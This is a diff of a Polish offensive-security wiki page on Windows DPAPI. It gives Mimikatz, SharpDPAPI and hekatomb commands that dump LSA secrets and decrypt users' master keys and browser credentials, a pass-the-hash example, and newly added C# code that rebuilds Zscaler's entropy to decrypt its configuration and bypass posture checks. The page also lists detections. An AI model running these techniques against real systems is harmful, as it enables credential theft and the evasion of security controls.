@@ -6,7 +6,7 @@
 
 ## Czym jest DPAPI
 
-Data Protection API (DPAPI) jest głównie wykorzystywane w systemie operacyjnym Windows do **symmetric encryption of asymmetric private keys**, wykorzystując jako istotne źródło entropii sekrety użytkownika lub systemu. Takie podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z sekretów logowania użytkownika lub, w przypadku szyfrowania systemowego, sekretów uwierzytelniania domeny systemu, eliminując w ten sposób potrzebę zarządzania ochroną klucza szyfrującego przez programistów.
+Data Protection API (DPAPI) jest głównie wykorzystywane w systemie operacyjnym Windows do **symmetric encryption of asymmetric private keys**, wykorzystując tajemnice użytkownika lub systemu jako istotne źródło entropii. Takie podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z tajemnic logowania użytkownika lub, w przypadku szyfrowania systemowego, tajemnic uwierzytelniania domeny systemu, eliminując w ten sposób potrzebę zarządzania ochroną klucza szyfrującego przez programistów.
 
 Najczęstszym sposobem użycia DPAPI jest korzystanie z funkcji **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom na bezpieczne szyfrowanie i deszyfrowanie danych z sesji procesu, który jest aktualnie zalogowany. Oznacza to, że zaszyfrowane dane mogą być odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.
 
@@ -14,20 +14,20 @@ Ponadto, te funkcje akceptują również parametr **`entropy`**, który będzie 
 
 ### Generowanie kluczy użytkowników
 
-DPAPI generuje unikalny klucz (nazywany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Klucz ten jest pochodną hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale kończy się na SHA1. Na przykład, dla użytkowników domenowych, **zależy od hasha HTLM użytkownika**.
+DPAPI generuje unikalny klucz (nazywany **`pre-key`**) dla każdego użytkownika na podstawie ich poświadczeń. Klucz ten jest pochodną hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale kończy się jako SHA1. Na przykład, dla użytkowników domenowych, **zależy od hasha HTLM użytkownika**.
 
 To jest szczególnie interesujące, ponieważ jeśli atakujący może uzyskać hash hasła użytkownika, może:
 
 - **Odszyfrować wszelkie dane, które zostały zaszyfrowane przy użyciu DPAPI** z kluczem tego użytkownika bez potrzeby kontaktowania się z jakimkolwiek API
 - Spróbować **złamać hasło** offline, próbując wygenerować ważny klucz DPAPI
 
-Ponadto, za każdym razem, gdy dane są szyfrowane przez użytkownika przy użyciu DPAPI, generowany jest nowy **klucz główny**. Ten klucz główny jest tym, który jest faktycznie używany do szyfrowania danych. Każdy klucz główny jest przypisany z **GUID** (Globally Unique Identifier), który go identyfikuje.
+Ponadto, za każdym razem, gdy dane są szyfrowane przez użytkownika przy użyciu DPAPI, generowany jest nowy **klucz główny**. Ten klucz główny jest tym, który faktycznie jest używany do szyfrowania danych. Każdy klucz główny jest przypisany z **GUID** (Globally Unique Identifier), który go identyfikuje.
 
-Klucze główne są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to identyfikator zabezpieczeń tego użytkownika. Klucz główny jest przechowywany zaszyfrowany kluczem **`pre-key`** użytkownika oraz kluczem **kopii zapasowej domeny** do odzyskiwania (więc ten sam klucz jest przechowywany zaszyfrowany 2 razy przez 2 różne hasła).
+Klucze główne są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to identyfikator bezpieczeństwa tego użytkownika. Klucz główny jest przechowywany zaszyfrowany kluczem **`pre-key`** użytkownika oraz kluczem **kopii zapasowej domeny** do odzyskiwania (więc ten sam klucz jest przechowywany zaszyfrowany 2 razy przez 2 różne hasła).
 
 Zauważ, że **klucz domeny używany do szyfrowania klucza głównego znajduje się w kontrolerach domeny i nigdy się nie zmienia**, więc jeśli atakujący ma dostęp do kontrolera domeny, może odzyskać klucz kopii zapasowej domeny i odszyfrować klucze główne wszystkich użytkowników w domenie.
 
-Zaszyfrowane bloby zawierają **GUID klucza głównego**, który został użyty do szyfrowania danych wewnątrz jego nagłówków.
+Zaszyfrowane bloby zawierają **GUID klucza głównego**, który został użyty do szyfrowania danych w swoich nagłówkach.
 
 > [!TIP]
 > Zaszyfrowane bloby DPAPI zaczynają się od **`01 00 00 00`**
@@ -41,35 +41,35 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-To jest to, jak wygląda zestaw Master Keys użytkownika:
+To, jak wygląda zestaw Master Keys użytkownika:
 
 ![](<../../images/image (1121).png>)
 
 ### Generowanie kluczy maszyny/systemu
 
-Jest to klucz używany przez maszynę do szyfrowania danych. Opiera się na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem, do którego dostęp ma tylko użytkownik SYSTEM. Klucz ten jest używany do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak poświadczenia na poziomie maszyny lub sekrety systemowe.
+To jest klucz używany przez maszynę do szyfrowania danych. Jest oparty na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem, do którego dostęp ma tylko użytkownik SYSTEM. Klucz ten jest używany do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak poświadczenia na poziomie maszyny lub sekrety systemowe.
 
 Należy zauważyć, że te klucze **nie mają kopii zapasowej w domenie**, więc są dostępne tylko lokalnie:
 
 - **Mimikatz** może uzyskać do nich dostęp, zrzucając sekrety LSA za pomocą polecenia: `mimikatz lsadump::secrets`
-- Sekret jest przechowywany w rejestrze, więc administrator może **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka rejestru to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Sekret jest przechowywany w rejestrze, więc administrator mógłby **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka rejestru to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
 
 ### Chronione dane przez DPAPI
 
 Wśród danych osobowych chronionych przez DPAPI znajdują się:
 
-- poświadczenia Windows
-- hasła i dane autouzupełniania Internet Explorera i Google Chrome
-- hasła do kont e-mail i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
-- hasła do folderów udostępnionych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrowania
-- hasła do połączeń z pulpitem zdalnym, .NET Passport i klucze prywatne do różnych celów szyfrowania i uwierzytelniania
-- hasła sieciowe zarządzane przez Menedżera poświadczeń oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN messenger i inne
+- Poświadczenia Windows
+- Hasła i dane autouzupełniania Internet Explorera i Google Chrome
+- Hasła do kont e-mail i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
+- Hasła do folderów współdzielonych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrowania
+- Hasła do połączeń z pulpitem zdalnym, .NET Passport oraz klucze prywatne do różnych celów szyfrowania i uwierzytelniania
+- Hasła sieciowe zarządzane przez Menedżera poświadczeń oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN messenger i inne
 - Szyfrowane bloby w rejestrze
 - ...
 
 Chronione dane systemowe obejmują:
-- hasła WiFi
-- hasła zadań zaplanowanych
+- Hasła WiFi
+- Hasła zadań zaplanowanych
 - ...
 
 ### Opcje ekstrakcji klucza głównego
@@ -120,7 +120,7 @@ mimikatz vault::list
 
 ### Znajdź zaszyfrowane dane DPAPI
 
-Typowe **pliki chronione** użytkowników znajdują się w:
+Typowe **pliki chronione** przez użytkowników znajdują się w:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
@@ -172,9 +172,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Uzyskaj dostęp do masterkey**:
+- **Dostęp do masterkey**:
 
-Zdejmij szyfrowanie masterkey użytkownika, żądając **klucza kopii zapasowej domeny** za pomocą RPC:
+Zdeszyfruj masterkey użytkownika, żądając **klucza kopii zapasowej domeny** za pomocą RPC:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -182,7 +182,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania masterkey (zauważ, że możliwe jest użycie `/rpc` do uzyskania klucza zapasowego domeny, `/password` do użycia hasła w postaci tekstu jawnego lub `/pvk` do określenia pliku klucza prywatnego domeny DPAPI...):
+Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania masterkey (zauważ, że możliwe jest użycie `/rpc`, aby uzyskać klucz zapasowy domeny, `/password`, aby użyć hasła w postaci tekstu jawnego, lub `/pvk`, aby określić plik klucza prywatnego domeny DPAPI...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -269,14 +269,14 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Z listy komputerów wyekstrahowanej z LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!
+Z listą komputerów wyekstrahowanych z LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!
 
 ### DonPAPI 2.x (2024-05)
 
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie zrzucać sekrety chronione przez DPAPI. Wersja 2.x wprowadziła:
 
 * Równoległe zbieranie blobs z setek hostów
-* Parsowanie **context 3** masterkeys i automatyczną integrację z Hashcat
+* Parsowanie **masterkeys kontekstu 3** i automatyczną integrację z Hashcat
 * Wsparcie dla zaszyfrowanych ciasteczek "App-Bound" w Chrome (patrz następna sekcja)
 * Nowy tryb **`--snapshot`**, aby wielokrotnie sprawdzać punkty końcowe i porównywać nowo utworzone blobs
 
@@ -284,23 +284,57 @@ Z listy komputerów wyekstrahowanej z LDAP możesz znaleźć każdą podsieć, n
 
 [**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser C# dla plików masterkey/credential/vault, który może wyprowadzać formaty Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie. W pełni obsługuje formaty masterkey dla maszyn i użytkowników do Windows 11 24H1.
 
-
-## Wspólne wykrycia
+## Typowe wykrycia
 
 - Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
 - Szczególnie z udziału sieciowego, takiego jak **C$** lub **ADMIN$**.
 - Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do uzyskania dostępu do pamięci LSASS lub zrzutu masterkeys.
 - Wydarzenie **4662**: *Operacja została wykonana na obiekcie* – może być skorelowane z dostępem do obiektu **`BCKUPKEY`**.
-- Wydarzenie **4673/4674**, gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)
+- Wydarzenie **4673/4674**, gdy proces żąda *SeTrustedCredManAccessPrivilege* (Menadżer poświadczeń)
 
 ---
-### Luki i zmiany w ekosystemie 2023-2025
+### Luki w latach 2023-2025 i zmiany w ekosystemie
 
-* **CVE-2023-36004 – Oszustwo kanału zabezpieczeń DPAPI w Windows** (listopad 2023). Atakujący z dostępem do sieci mógłby oszukać członka domeny, aby pobrał złośliwy klucz zapasowy DPAPI, co pozwala na odszyfrowanie masterkeys użytkowników. Poprawione w listopadowej aktualizacji zbiorczej 2023 – administratorzy powinni upewnić się, że DC i stacje robocze są w pełni załatane.
-* **Szyfrowanie ciasteczek "App-Bound" w Chrome 127** (lipiec 2024) zastąpiło starszą ochronę tylko DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Offline odszyfrowanie ciasteczek teraz wymaga zarówno masterkey DPAPI, jak i **klucza związane z aplikacją w formacie GCM**. SharpChrome v2.3 i DonPAPI 2.x są w stanie odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.
+* **CVE-2023-36004 – Oszustwo kanału zabezpieczeń DPAPI w Windows** (listopad 2023). Atakujący z dostępem do sieci mógłby oszukać członka domeny, aby uzyskał złośliwy klucz zapasowy DPAPI, co pozwala na odszyfrowanie masterkeys użytkowników. Poprawione w listopadowej aktualizacji zbiorczej 2023 – administratorzy powinni upewnić się, że DC i stacje robocze są w pełni załatane.
+* **Szyfrowanie ciasteczek "App-Bound" w Chrome 127** (lipiec 2024) zastąpiło starszą ochronę tylko DPAPI dodatkowym kluczem przechowywanym w **Menadżerze poświadczeń** użytkownika. Offline odszyfrowanie ciasteczek teraz wymaga zarówno masterkey DPAPI, jak i **klucza związane z aplikacją w formacie GCM**. SharpChrome v2.3 i DonPAPI 2.x są w stanie odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.
 
+### Studium przypadku: Zscaler Client Connector – Niestandardowa entropia pochodząca z SID
 
-## Odnośniki
+Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest szyfrowany za pomocą **DPAPI (zakres maszyny)**, ale dostawca dostarcza **niestandardową entropię**, która jest *obliczana w czasie rzeczywistym* zamiast być przechowywana na dysku.
+
+Entropia jest odbudowywana z dwóch elementów:
+
+1. Tajny klucz zakodowany w `ZSACredentialProvider.dll`.
+2. **SID** konta Windows, do którego należy konfiguracja.
+
+Algorytm zaimplementowany przez DLL jest równoważny z:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Ponieważ sekret jest osadzony w DLL, który można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może ponownie wygenerować entropię dla dowolnego SID** i odszyfrować bloby offline:
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+Deszyfrowanie daje pełną konfigurację JSON, w tym każdy **sprawdzanie postawy urządzenia** i jego oczekiwaną wartość – informacje, które są bardzo cenne podczas prób obejścia po stronie klienta.
+
+> TIP: inne zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przez DPAPI **bez** entropii (`16` zerowych bajtów). Można je zatem deszyfrować bezpośrednio za pomocą `ProtectedData.Unprotect`, gdy uzyskane zostaną uprawnienia SYSTEM.
+
+## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
